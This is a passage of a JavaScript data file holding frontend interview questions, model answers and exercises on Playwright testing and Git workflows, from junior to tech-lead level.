  const r = await new AxeBuilder({ page }).withTags(['wcag2a', 'wcag2aa', 'wcag22aa']).analyze();
  expect(r.violations).toEqual([]);
});`,
            },
            {
              task: `Test a dialog with only the keyboard.`,
              description: `Checks what axe misses. Write steps to verify a modal traps focus and returns it on close.`,
              answer: `Focus the opener, press Enter, assert focus is inside the dialog, press Tab repeatedly and assert it stays inside, press Escape and assert focus returns to the opener. axe cannot verify this behavior.`,
            },
          ],
        },
      ],
      senior: [
        {
          q: `This Playwright test fails sometimes in CI. Fix it.`,
          code: `test('creates applicant', async ({ page }) => {
  await page.goto('/applicants');
  await page.click('.btn-primary');
  await page.waitForTimeout(2000);
  await page.fill('#name', 'Ann');
  await page.click('text=Save');
  const rows = await page.$$('.row');
  expect(rows.length).toBe(11);
});`,
          short: `Fixed sleeps, CSS selectors and a count depending on shared data cause flakiness. Use role locators, web-first assertions that auto-wait, and isolated test data.`,
          long: `waitForTimeout is too short on slow CI and wastes time locally.\nLocators (getByRole) auto-wait for actionability.\nexpect(locator).toHaveCount/toBeVisible retries until timeout; $$ snapshots once.\nAsserting exactly 11 rows depends on what other tests created; use unique data and assert on it.\nSeed or create data via API in a fixture; clean up afterwards.\nUse trace: 'on-first-retry' to debug CI failures.`,
          fix: `test('creates applicant', async ({ page }) => {
  const name = \`Ann \${crypto.randomUUID().slice(0, 8)}\`;
  await page.goto('/applicants');
  await page.getByRole('button', { name: 'New applicant' }).click();
  await page.getByLabel('Name').fill(name);
  await page.getByRole('button', { name: 'Save' }).click();
  await expect(page.getByRole('row', { name })).toBeVisible();
});`,
          exercises: [
            {
              task: `Make the flaky failure happen on purpose.`,
              description: `Checks debugging technique. Run npx playwright test --repeat-each=20 --workers=4 on the original test.`,
              answer: `Repetition and parallel workers expose timing and data races; the original fails intermittently. The fixed test passes all runs. Opening the trace viewer for failures shows exactly where timing diverged.`,
            },
            {
              task: `Log in once and reuse the session in all tests.`,
              description: `Checks setup projects and storageState.`,
              answer: `Create auth.setup.ts that logs in and calls page.context().storageState({ path: '.auth/user.json' }); in config add a setup project and make others depend on it with use.storageState. Tests skip the UI login, becoming faster and less flaky.`,
            },
          ],
        },
        {
          q: `How do you do screenshot testing without too many false failures?`,
          short: `Use Playwright toHaveScreenshot or a service (Chromatic, Percy) on stable component stories, run in a fixed Docker environment, mask dynamic content, disable animations and set sensible thresholds.`,
          long: `Rendering differs across OS, fonts and GPU: generate baselines in the same container image as CI.\nStabilize: fixed dates (page.clock), mocked data, masks for avatars/timestamps, animations: 'disabled'.\nPrefer component-level snapshots (Storybook) over whole pages: smaller, clearer diffs.\nmaxDiffPixelRatio small but non-zero for anti-aliasing.\nReview diffs as part of PR; update baselines with --update-snapshots deliberately.\nCover themes, breakpoints and key states, not everything.\nTrack false-positive rate; if reviewers rubber-stamp, the suite is useless.`,
          ai: true,
          exercises: [
            {
              task: `Write a stable screenshot test for a page with a clock and an avatar.`,
              description: `Checks stabilization in Playwright.`,
              answer: `Install page.clock.setFixedTime, mock API data, then expect(page).toHaveScreenshot('dashboard.png', { mask: [page.getByTestId('avatar')], animations: 'disabled', maxDiffPixelRatio: 0.01 }). Run in the Playwright Docker image to match CI.`,
            },
            {
              task: `How do you update the saved screenshots after a design change?`,
              description: `Checks workflow.`,
              answer: `Run npx playwright test --update-snapshots in the same Docker image (or a CI job that commits them), and review the image diffs in the PR. Never update baselines locally on macOS for Linux CI.`,
            },
          ],
        },
        {
          q: `How do you test speed automatically and keep the results stable?`,
          short: `Combine deterministic checks (bundle size) as hard gates with noisy metrics (Lighthouse, benchmarks) using multiple runs, medians, fixed hardware and trend tracking rather than single-run thresholds.`,
          long: `Bundle size is deterministic: gate PRs with size-limit.\nLighthouse CI: 3-5 runs, median, consistent throttling, same runner type.\nRuntime: Vitest bench (tinybench) for hot functions; compare against baseline with tolerance.\nPlaywright can collect performance marks and Long Animation Frames for key interactions.\nShared CI runners are noisy: use dedicated runners or relative comparisons in the same job.\nAlert on trends over several commits.\nField RUM remains the truth.`,
          ai: true,
          exercises: [
            {
              task: `Compare two sort functions with Vitest bench.`,
              description: `Checks Vitest bench; run npx vitest bench.`,
              answer: `Use bench('native sort', () => ...) and bench('custom', () => ...) inside describe. The output shows ops/sec and relative margin; treat small differences within margin of error as noise.`,
            },
            {
              task: `Measure how long filtering takes in Playwright.`,
              description: `Checks runtime perf testing. Measure time from clicking Filter to results rendered.`,
              answer: `Call performance.mark in the app around the operation (or evaluate in page), click, wait for results, then read performance.measure via page.evaluate. Run several times and assert the median stays under a budget.`,
            },
          ],
        },
      ],
      techlead: [
        {
          q: `How do you decide what to test at each level for a new feature? How do you get the team to follow it?`,
          short: `Choose by risk and confidence per cost: pure logic in unit tests, components with real hooks and MSW in integration tests, a few critical journeys in E2E. Make it explicit in a test plan template and review it like code.`,
          long: `Testing trophy: most value in integration tests for UI.\nUnit: complex calculations, parsers, reducers.\nIntegration: user flows within a page with mocked network.\nE2E: login, submit application, payments — revenue-critical paths only.\nContract tests for API boundaries; a11y and visual checks for UI-heavy work.\nPR template asks "what did you test and why"; reviewers check tests behave like users.\nMetrics: escaped defects by level, suite time, flake rate.`,
          ai: true,
          exercises: [
            {
              task: `Write a test plan for importing applicants from a CSV file.`,
              description: `Checks decision-making. Allocate tests per level.`,
              answer: `Unit: CSV parsing/validation edge cases. Integration: upload component with MSW showing per-row errors and progress. E2E: one happy path upload and one with errors. Plus a11y scan of the error table and a contract test for the import endpoint.`,
            },
            {
              task: `A senior developer says tests slow them down. What do you say?`,
              description: `Checks leadership. Respond in 4 sentences.`,
              answer: `Acknowledge the cost and look at data: which tests are slow or brittle? Remove low-value tests and invest in fast integration tests. Show escaped bugs that tests would have caught. Agree on a lightweight minimum rather than mandating coverage numbers.`,
            },
          ],
        },
        {
          q: `Fix this Playwright config for a big test suite in CI.`,
          code: `import { defineConfig } from '@playwright/test';
export default defineConfig({
  timeout: 120000,
  retries: 5,
  workers: 1,
  use: { video: 'on', trace: 'on' },
});`,
          short: `Huge timeouts and 5 retries hide flakiness, one worker makes it slow, and always-on video/trace bloats artifacts. Use parallel workers/sharding, few retries with flaky reporting, and traces only on retry.`,
          long: `retries: 5 lets broken tests pass silently; 1-2 in CI with flaky tracking is enough.\n2-minute timeouts slow feedback on real failures.\nfullyParallel with multiple workers and sharding across machines.\nforbidOnly prevents test.only from slipping into CI.\ntrace: 'on-first-retry' and video: 'retain-on-failure' keep artifacts useful and small.\nwebServer starts the app; reporter blob for merging shards.\nProjects for browsers you actually support.`,
          fix: `import { defineConfig, devices } from '@playwright/test';
const CI = !!process.env.CI;
export default defineConfig({
  fullyParallel: true,
  forbidOnly: CI,
  retries: CI ? 2 : 0,
  workers: CI ? '50%' : undefined,
  timeout: 30_000,
  reporter: CI ? 'blob' : 'html',
  use: { baseURL: 'http://localhost:4173', trace: 'on-first-retry', video: 'retain-on-failure' },
  webServer: { command: 'npm run preview', url: 'http://localhost:4173', reuseExistingServer: !CI },
  projects: [
    { name: 'chromium', use: { ...devices['Desktop Chrome'] } },
    { name: 'webkit', use: { ...devices['Desktop Safari'] } },
  ],
});`,
          exercises: [
            {
              task: `Find which tests pass only after a retry.`,
              description: `Checks reporting across runs.`,
              answer: `Playwright marks them "flaky" in reports; export JSON reporter results to a dashboard (or use a test analytics service) and rank by flaky count. Assign owners for the top offenders each sprint.`,
            },
            {
              task: `Join test reports from all machines into one.`,
              description: `Checks sharded CI. Describe merging blob reports in GitHub Actions.`,
              answer: `Each shard uploads blob-report as an artifact; a final job downloads all with pattern and merge-multiple, then runs npx playwright merge-reports --reporter html ./all-blob-reports and uploads the HTML report.`,
            },
          ],
        },
        {
          q: `You get an app with no tests and many bugs after each release. What is your six month plan?`,
          short: `Start with smoke E2E tests on critical journeys and CI gates, then test every bug fix and new code, add integration test infrastructure (MSW, factories), and expand coverage where regressions cluster, measuring escaped defects.`,
          long: `Month 1: CI pipeline with lint/typecheck; 5-10 Playwright smoke tests on revenue-critical flows.\nRule: every bug fix ships with a regression test; every new feature with tests.\nMonth 2-3: test infrastructure — Vitest, Testing Library, MSW, data factories, docs and examples.\nMonth 3-4: characterization tests around risky legacy modules before refactoring.\nMonth 4-6: a11y scans, visual regression for the design system, contract tests.\nTrack: regressions per release, time to detect, suite duration and flake rate.\nCelebrate catches; budget time explicitly in sprints.`,
          ai: true,
          exercises: [
            {
              task: `Pick five main end to end tests for an admissions app.`,
              description: `Checks prioritization.`,
              answer: `Login, search and open an applicant, update an application status, submit/export a report, and an admin settings change. These cover the most-used and highest-impact flows.`,
            },
            {
              task: `How do you test a big old function before you change it?`,
              description: `Checks characterization testing for an untested 400-line function.`,
              answer: `Call it with many representative inputs and snapshot or record the current outputs (even if they seem wrong). The tests lock in existing behavior so a refactor can be verified; real bugs are fixed in separate commits.`,
            },
          ],
        },
      ],
    },

    'Version Control (Git)': {
      junior: [
        {
          q: `What is the difference between git fetch and git pull?`,
          short: `git fetch downloads new commits and branches from the remote without changing your working branch; git pull is fetch plus merge (or rebase) into the current branch.`,
          long: `fetch updates remote-tracking refs like origin/main.\nYou can inspect with git log main..origin/main before integrating.\npull = fetch + merge by default; pull --rebase replays local commits on top.\nSet git config pull.rebase true (or ff only) to avoid accidental merge commits.\nfetch is always safe; pull can create conflicts.\nUse git fetch --prune to remove deleted remote branches.`,
          exercises: [
            {
              task: `See new commits from the team before you merge them.`,
              description: `Checks safe workflow. Show the commands.`,
              answer: `git fetch origin, then git log --oneline main..origin/main to list incoming commits and git diff main origin/main to view changes. Integrate afterwards with git merge or git rebase.`,
            },
            {
              task: `Set git pull to fast forward only.`,
              description: `Checks config; run git config --global pull.ff only.`,
              answer: `With pull.ff only, git pull fails instead of creating a merge commit when histories diverged. You then decide explicitly whether to rebase or merge, keeping history clean.`,
            },
          ],
        },
        {
          q: `You committed a secret env file. Fix the repo and stop it from happening again.`,
          code: `git add .
git commit -m "add config"
git push`,
          short: `Rotate the secret immediately, remove the file from tracking and add it to .gitignore. If it was pushed, history must be rewritten (git filter-repo) but rotation is what really matters.`,
          long: `Once pushed, assume the secret is compromised; rotate it first.\ngit rm --cached .env removes it from tracking while keeping the local file.\nAdd .env to .gitignore and commit a .env.example instead.\nTo purge history use git filter-repo, then force-push and ask teammates to re-clone.\nForks and caches may still contain it, hence rotation.\nPrevention: GitHub secret scanning push protection, pre-commit hooks (gitleaks), avoid git add . blindly.`,
          fix: `# 1. Rotate the leaked credentials first
git rm --cached .env
echo ".env" >> .gitignore
cp .env .env.example   # then strip real values
git add .gitignore .env.example
git commit -m "Stop tracking .env"
# If pushed: git filter-repo --path .env --invert-paths && git push --force-with-lease`,
          exercises: [
            {
              task: `Check your changes before you commit.`,
              description: `Checks habits. Show commands to review changes.`,
              answer: `git status to see files, git diff --staged to review the exact staged content, and git add -p to stage hunks selectively. This catches stray files and debug code before they are committed.`,
            },
            {
              task: `Scan for secrets before each commit.`,
              description: `Checks prevention. Configure gitleaks as a pre-commit hook.`,
              answer: `Install gitleaks and add a pre-commit hook (via husky or pre-commit framework) running gitleaks protect --staged. The commit is blocked when a secret pattern is detected.`,
            },
          ],
        },
        {
          q: `What is a good commit message? Why are small commits important?`,
          short: `A good commit has a short imperative summary (~50 chars), a blank line and a body explaining why. Small focused commits are easier to review, revert and bisect.`,
          long: `Summary in imperative mood: "Fix date parsing in report filter".\nBody explains why and any side effects; the diff shows what.\nReference the ticket (e.g. [OUT-123]) per team convention.\nConventional Commits (feat:, fix:) enable automated changelogs.\nOne logical change per commit; do not mix refactors with fixes.\nSmall commits make git revert and git bisect precise.`,
          exercises: [
            {
              task: `Rewrite these bad commit messages.`,
              description: `Checks message quality. Improve: "fix", "changes", "WIP stuff".`,
              answer: `Examples: "Fix crash when applicant has no email", "Rename UserCard props for clarity", "Add pagination to applicants table". Each states the change and could stand alone in a changelog.`,
            },
            {
              task: `Split one file change into two commits.`,
              description: `Checks git add -p. You changed formatting and logic in the same file.`,
              answer: `Use git add -p to stage only the logic hunks and commit, then stage the rest and commit as formatting. Reviewers can then read the logic change without formatting noise.`,
            },
          ],
        },
      ],
      middle: [
        {
          q: `How do you use interactive rebase to clean up a branch before a pull request?`,
          short: `git rebase -i origin/main lets you reorder, squash, fixup, reword or drop commits. Use fixup commits with --autosquash for smoother cleanup, and only rewrite branches others are not using.`,
          long: `pick keeps a commit; reword edits the message; squash/fixup merge into the previous commit; drop removes it.\ngit commit --fixup=<sha> then git rebase -i --autosquash origin/main places fixups automatically.\nAfter rewriting, push with --force-with-lease, which refuses if the remote moved.\nNever rewrite shared branches like main.\nIf something goes wrong: git rebase --abort, or git reflog to recover.\nSome teams squash-merge PRs instead, making this less necessary.`,
          exercises: [
            {
              task: `Fix a typo in an older commit on your branch.`,
              description: `Checks fixup workflow for commit abc123.`,
              answer: `Edit the file, git commit --fixup=abc123, then git rebase -i --autosquash origin/main (or set rebase.autoSquash true). The fix is folded into abc123 and history reads as if it was right originally.`,
            },
            {
              task: `What is the difference between force and force with lease?`,
              description: `Checks safe pushing.`,
              answer: `--force overwrites the remote branch unconditionally, potentially deleting a teammate's pushed commits. --force-with-lease only overwrites if the remote still points to what you last fetched, otherwise it refuses.`,
            },
          ],
        },
        {
          q: `The gitignore file does not hide node modules and dist. Fix it.`,
          code: `# .gitignore
/node_modules
dist/
.env
# but git status still shows node_modules/ and dist/ changes`,
          short: `.gitignore only affects untracked files; these were already committed. Remove them from the index with git rm -r --cached and commit.`,
          long: `Once a file is tracked, ignore rules do not apply to it.\ngit rm -r --cached node_modules dist untracks them while leaving them on disk.\nCommit the removal; afterwards they stay ignored.\nUse git check-ignore -v <path> to debug which rule applies.\nLeading / anchors to the .gitignore's directory; node_modules/ (no slash) matches at any depth in monorepos.\nGlobal ignores (OS files, editor folders) belong in core.excludesFile.`,
          fix: `# .gitignore
node_modules/
dist/
.env

git rm -r --cached node_modules dist
git commit -m "Stop tracking build output and dependencies"`,
          exercises: [
            {
              task: `Find out why a nested node modules folder is not ignored.`,
              description: `Checks check-ignore for packages/app/node_modules.`,
              answer: `Run git check-ignore -v packages/app/node_modules/x; no output means no rule matches. The /node_modules rule only matches the root, so change it to node_modules/ to match any depth.`,
            },
            {
              task: `Ignore Mac system files in all your repos.`,
              description: `Checks global config for .DS_Store.`,
              answer: `Create ~/.gitignore_global with .DS_Store and run git config --global core.excludesFile ~/.gitignore_global. Personal OS/editor files stay out of every repo without polluting shared config.`,
            },
          ],
        },
        {
          q: `What is git stash? When do you use git cherry pick?`,
          short: `stash shelves uncommitted changes so you can switch context and reapply later. cherry-pick applies a specific commit from another branch onto the current one, e.g. backporting a fix to a release branch.`,
          long: `git stash push -m "msg" saves changes; git stash pop reapplies and drops; apply keeps it.\n-u includes untracked files; git stash list/show to inspect.\nStashes are easy to forget; prefer a WIP commit for long-lived work.\ngit cherry-pick <sha> creates a new commit with the same change (different SHA).\n-x adds "cherry picked from" to the message for traceability.\nOveruse causes duplicate commits and conflicts; prefer merging when possible.`,
          exercises: [
            {
              task: `Copy a fix from main to a release branch.`,
              description: `Checks cherry-pick of commit f00d to release/2.3.`,
              answer: `git switch release/2.3, git cherry-pick -x f00d, resolve conflicts if any, run tests and push. The -x note links the backport to the original commit.`,
            },
            {
              task: `Save new files too before you switch branch.`,
              description: `Checks stash options with untracked files.`,
              answer: `git stash push -u -m "wip feature" stashes tracked and untracked changes. After returning, git stash pop restores them; check git stash list if you have several.`,
            },
          ],
        },
      ],
      senior: [
        {
          q: `How do git worktree, sparse checkout, and partial clone help with big repositories?`,
          short: `Worktrees let you check out multiple branches simultaneously from one repo; sparse checkout limits the working tree to needed folders; partial clone (--filter=blob:none) downloads file contents on demand.`,
          long: `git worktree add ../hotfix hotfix-branch: separate directory, shared object store, no stash juggling.\nGreat for reviewing a PR while keeping your work open, or running agents in parallel.\nSparse checkout (git sparse-checkout set apps/web packages/ui) shrinks working tree in monorepos.\nPartial clone --filter=blob:none fetches history but blobs lazily; --filter=tree:0 even lighter.\nShallow clones (--depth=1) are good for CI but break merge-base/bisect.\nScalar (bundled with git) configures these for huge repos.`,
          exercises: [
            {
              task: `Review a pull request in a second folder with worktree.`,
              description: `Checks worktrees for branch feature/x.`,
              answer: `git fetch origin feature/x, git worktree add ../review-x origin/feature/x, work there, then git worktree remove ../review-x. Your main checkout is untouched.`,
            },
            {
              task: `Clone only the web app folder of a huge repository.`,
              description: `Checks partial plus sparse clone for apps/web.`,
              answer: `git clone --filter=blob:none --sparse <url>, then git sparse-checkout set apps/web packages/shared. Only needed blobs download, cutting clone time and disk usage drastically.`,
            },
          ],
        },
        {
          q: `You resolve the same merge conflicts again and again when you update a long branch. How can Git help?`,
          code: `git checkout feature/big-form
git merge origin/main   # same conflicts as yesterday
# fix by hand again...`,
          short: `Turn on git rerere so Git remembers how you solved a conflict and applies it again. Better still, merge main more often or split the branch.`,
          long: `rerere means "reuse recorded resolution".
With rerere.enabled set to true, Git saves the conflict and your fix, and next time it sees the same conflict it applies the same fix.
You still review the result and run tests before committing.
It helps with long-running branches and repeated rebases.
The real fix is process: smaller branches, feature flags, and merging main often.
Strong answer: knows rerere, its limits and the process fix.`,
          fix: `git config --global rerere.enabled true
git merge origin/main      # resolve once, commit
# next time the same conflict is solved automatically
git rerere status          # see recorded resolutions
git diff                   # always review before committing`,
          follow: `Why are long-lived branches a problem even with rerere?`,
          exercises: [
            {
              task: `rerere applied a wrong fix. How do you undo it for one file?`,
              description: `Checks recovery.`,
              answer: `Run git rerere forget <file> to drop the saved resolution, then git checkout -m <file> to restore the conflict and fix it again.`,
            },
            {
              task: `What process change avoids most of these conflicts?`,
              description: `Checks the root cause.`,
              answer: `Keep branches short-lived, merge small slices behind feature flags, and update from main every day.`,
            },
          ],
        },
        {
          q: `How do you enforce good commits and branches with hooks and server rules?`,
          short: `Client hooks (husky + lint-staged, commitlint) give fast feedback but are bypassable; enforce truly with branch protection/rulesets, required status checks, required reviews and signed commits on the server.`,
          long: `pre-commit: lint-staged runs ESLint/Prettier on staged files only to stay fast.\ncommit-msg: commitlint validates message format/ticket key.\nHooks can be skipped with --no-verify, so CI must re-check.\nGitHub rulesets: require PR, approvals, CODEOWNERS review, status checks, linear history, block force pushes.\nRequire signed commits (SSH or GPG signing) where provenance matters.\nMerge queue ensures main stays green when many PRs merge.\nKeep hooks fast (<5s) or developers will disable them.`,
          ai: true,
          exercises: [
            {
              task: `Run lint and format only on staged files before commit.`,
              description: `Checks husky + lint-staged setup for TS files.`,
              answer: `npx husky init, write npx lint-staged into .husky/pre-commit, and in package.json add "lint-staged": { "*.{ts,tsx}": ["eslint --fix", "prettier --write"] }. Only staged files are processed, keeping commits fast.`,
            },
            {
              task: `Require a ticket key at the start of each commit message.`,
              description: `Checks commit-msg hook for [OUT-123] prefix.`,
              answer: `Add a commit-msg hook that tests the first line against /^\\[OUT-\\d+\\] .+/ and exits 1 otherwise. Mirror the same check in CI (e.g. on PR title or commits) since hooks are bypassable.`,
            },
          ],
        },
      ],
      techlead: [
        {
          q: `How do you use tags and semantic versioning for frontend releases?`,
          short: `Tag each release commit with a version like v2.4.1, follow major.minor.patch rules, and generate the changelog from commits so you can always find and redeploy any release.`,
          long: `A tag is a fixed name for one commit. Annotated tags store the author, date and message.
Semantic versioning: major for breaking changes, minor for new features, patch for fixes.
For an app (not a library) the version is mainly for tracing: which code is live, and what to roll back to.
Automate it: Conventional Commits plus a tool like release-please or semantic-release creates the version, tag and changelog.
Show the version in the app and send it with error reports, so a bug report points to an exact commit.
Strong answer: tags as release anchors, automation, and linking versions to monitoring.`,
          follow: `Why should the version number be visible in error reports?`,
          exercises: [
            {
              task: `Create an annotated tag for release 2.4.1 and push it.`,
              description: `Checks the commands.`,
              answer: `Use git tag -a with a message, then push the tag.`,
              solution: `git tag -a v2.4.1 -m "Release 2.4.1"
git push origin v2.4.1`,
            },
            {
              task: `Which version comes after 2.4.1 for: a bug fix, a new filter, removing an old API?`,
              description: `Checks semver rules.`,
              answer: `Bug fix: 2.4.2. New feature: 2.5.0. Breaking change: 3.0.0.`,
            },
          ],
        },
        {
          q: `Someone force pushed to main and commits are gone. Get them back and stop this from happening again.`,
          code: `git push --force origin main
# remote main now points to an old commit; 12 merged PRs vanished`,
          short: `Find the previous tip (reflog of someone's local clone, GitHub activity/events API, or PR merge SHAs), push it back, then enable rulesets that block force pushes and deletions on main.`,
          long: `Anyone who fetched recently has origin/main at the old tip; git reflog show origin/main reveals it.\nGitHub: the repository Activity view shows the force push with before/after SHAs; PR pages show merge commits.\nRestore with git push origin <old-sha>:main --force-with-lease=main:<bad-sha>.\nCommunicate to the team to avoid further pushes until restored.\nPrevention: ruleset on main blocking force pushes and deletions, require PRs, restrict bypass.\nBlameless postmortem; usually a local alias or tooling misconfiguration.`,
          fix: `# On a clone that fetched before the incident
git reflog show origin/main        # find the lost tip, e.g. 9fceb02
git push origin 9fceb02:main --force-with-lease=main:<current-bad-sha>
# Then: Settings -> Rules -> Rulesets -> target main: block force pushes, restrict deletions, require PR`,
          exercises: [
            {
              task: `Find the lost commit without a local copy.`,
              description: `Checks GitHub tooling with gh api.`,
              answer: `Use the repo Activity page or gh api repos/OWNER/REPO/activity?ref=refs/heads/main which lists pushes including force pushes with before and after SHAs. The before SHA is the commit to restore.`,
            },
            {
              task: `List the protection rules for the main branch.`,
              description: `Checks protection design.`,
              answer: `Require pull request with 1+ approvals and CODEOWNERS review, required status checks, block force pushes, restrict deletions, require linear history and limit bypass to an emergency admin group with audit.`,
            },
          ],
        },
        {
          q: `How do you teach twenty people the same Git rules without micromanaging?`,
          short: `Write a short documented workflow, automate the rules (hooks, CI, rulesets, PR templates), provide examples and pairing, and measure outcomes like PR size and lead time instead of policing individuals.`,
          long: `One-page CONTRIBUTING guide: branch naming, commit format, PR size, review SLA.\nAutomate everything enforceable: commitlint, branch name check, PR template, required checks.\nPaved road: scripts/aliases to create branches from tickets, gh CLI usage.\nTeach the hard parts (rebase, conflicts, bisect, reflog) in a workshop with exercises.\nReview culture: kind, fast, focused on behavior; reviewers rotate.\nDashboards: PR size distribution, time to first review, revert rate.\nIterate the guide via retros.`,
          ai: true,
          exercises: [
            {
              task: `Write a pull request template.`,
              description: `Checks practical artifacts. Draft sections for .github/pull_request_template.md.`,
              answer: `Summary (what and why), linked ticket, screenshots for UI, testing done, risk/rollback notes and a checklist (tests added, a11y checked, no secrets). It nudges consistency without manual policing.`,
            },
            {
              task: `Check branch names in CI.`,
              description: `Checks automation. Fail when the head branch doesn't match feature/OUT-123-desc or bugfix/OUT-123-desc.`,
              answer: `In a pull_request workflow, pass github.head_ref via env and test it with a regex like ^(feature|bugfix)/OUT-[0-9]+-[a-z0-9-]+$ using grep -E, exiting 1 on mismatch. Using env avoids script injection from branch names.`,
              solution: `- env:
    BRANCH: \${{ github.head_ref }}
  run: echo "$BRANCH" | grep -Eq '^(feature|bugfix)/OUT-[0-9]+-[a-z0-9-]+$'`,
            },
          ],
        },
      ],
    },
  },
};
